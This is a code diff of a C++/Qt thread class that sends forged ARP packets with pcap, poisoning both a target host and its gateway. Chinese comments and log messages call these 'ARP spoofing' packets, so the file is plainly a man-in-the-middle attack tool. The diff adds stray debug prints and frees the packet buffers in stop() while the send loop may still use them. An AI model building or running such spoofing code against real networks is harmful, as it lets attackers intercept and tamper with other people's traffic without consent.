@@ -1,17 +1,24 @@
 #include "sendthread.h"
 #include <QString>
+#include <QDebug>
+#include "arphead.h"
+#include "windows.h"
 
 SendThread::SendThread(pcap_t *_adhandle, u_char *_currentMac, u_long _targetIp, u_char *_targetMac, u_long _gateIp, u_char *_gateMac):\
     isStopped(false), adhandle(_adhandle), currentMac(_currentMac), targetIp(_targetIp), targetMac(_targetMac), gateIp(_gateIp), gateMac(_gateMac)
 {
+    qDebug() << 2;
     fakeTargetArpPkt = BuildArpPacket(currentMac, gateIp, targetMac, targetIp);
     fakeGateArpPkt = BuildArpPacket(currentMac, targetIp, gateMac, gateIp);
+    qDebug() << 2;
 }
 
 void SendThread::stop()
 {
     QMutexLocker locker(&mlock);
     isStopped = true;
+    free(fakeTargetArpPkt);
+    free(fakeGateArpPkt);
 }
 
 void SendThread::run()
@@ -19,7 +26,6 @@ void SendThread::run()
     while(isStopped != true)
     {
         //构建欺骗目标主机的arp数据包,源IP为网关IP
-        fakeTargetArpPkt = BuildArpPacket(currentMac, gateIp, targetMac, targetIp);
         if(pcap_sendpacket(adhandle, fakeTargetArpPkt, 42) == -1)
         {
             emit sendLogMsg("向目标主机发送ARP欺骗报文失败!");
@@ -29,8 +35,8 @@ void SendThread::run()
             emit sendLogMsg("向目标主机发送ARP欺骗报文成功!");
         }
         //构建欺骗网关的arp数据包，源IP为受害主机的IP
-        fakeGateArpPkt = BuildArpPacket(currentMac, targetIp, gateMac, gateIp);
-        if(pcap_sendpacket(adhandle, fakeGateArpPkt, 42) == -1)
+        if(pcap_sendpacket(adhandle, fakeGateArpPkt, 42
+                           ) == -1)
         {
             emit sendLogMsg("向目标网关发送ARP欺骗报文失败!");
         }
